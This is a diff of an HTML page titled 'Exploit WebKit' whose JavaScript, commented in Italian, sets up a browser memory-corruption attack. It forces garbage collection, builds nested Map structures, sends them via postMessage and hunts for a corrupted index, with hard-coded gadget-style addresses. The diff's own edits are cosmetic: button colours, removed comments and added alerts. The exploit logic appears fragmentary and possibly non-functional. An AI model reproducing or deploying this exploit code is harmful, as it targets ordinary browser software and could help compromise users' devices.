@@ -6,7 +6,7 @@
     <title>Exploit WebKit</title>
     <style>
         #runExploit {
-            background-color: red;
+            background-color: blue;
             color: white;
             font-size: 20px;
             padding: 10px 20px;
@@ -15,7 +15,7 @@
         }
 
         #runExploit:active {
-            background-color: darkred;
+            background-color: darkblue;
         }
     </style>
     <script>
@@ -28,24 +28,22 @@
             exit: 0x0000000000402222
         };
 
-        // Garbage Collection
         function gc() {
             try {
                 new Uint8Array(256 * 1024); // Alloca memoria per attivare il GC
                 alert('GC eseguita.');
             } catch (e) {
-                console.error("Errore durante la GC:", e.message);
+                alert("Errore durante la GC: " + e.message);
             }
         }
 
-        // Crea struttura di memoria
         function createObjectStructure(numElems) {
             let root = new Map();
             let msg = root;
             let foo = [];
 
             for (let i = 0; i < 5; i++) {
-                foo.push(new Date(0xffff)); // Oggetti placeholder
+                foo.push(new Date(0xffff));
             }
 
             for (let i = 0; i < numElems; i++) {
@@ -60,7 +58,6 @@
             return root;
         }
 
-        // Funzione principale
         async function main() {
             alert("Inizio exploit...");
 
@@ -70,7 +67,7 @@
             let idx = null;
             let found = false;
             let attempts = 0;
-            const maxAttempts = 3; // Limite per evitare loop infiniti
+            const maxAttempts = 3;
 
             while (!found && attempts < maxAttempts) {
                 attempts++;
@@ -84,13 +81,12 @@
                     });
 
                     alert(`Tentativo ${attempts}: Invio messaggio...`);
-                    postMessage(msg, '*');  // Invio messaggio
+                    postMessage(msg, '*');
                     await prom;
 
                     alert("Messaggio ricevuto con successo.");
                     gc();
 
-                    // Ricerca dell'indice
                     for (let i = 0; i < numElems; i++) {
                         if (data.keys().next().value.getTime() === 0xffff) {
                             idx = i;
@@ -100,8 +96,7 @@
                         data = data.values().next().value[0];
                     }
                 } catch (e) {
-                    console.error("Errore durante la ricerca dell'indice:", e.message);
-                    alert("Errore: " + e.message);
+                    alert("Errore durante la ricerca dell'indice: " + e.message);
                 }
             }
 
@@ -114,8 +109,8 @@
             }
         }
 
-        // Avvia exploit al click
         document.getElementById('runExploit').addEventListener('click', async () => {
+            alert("Avvio exploit...");
             await main();
         });
     </script>
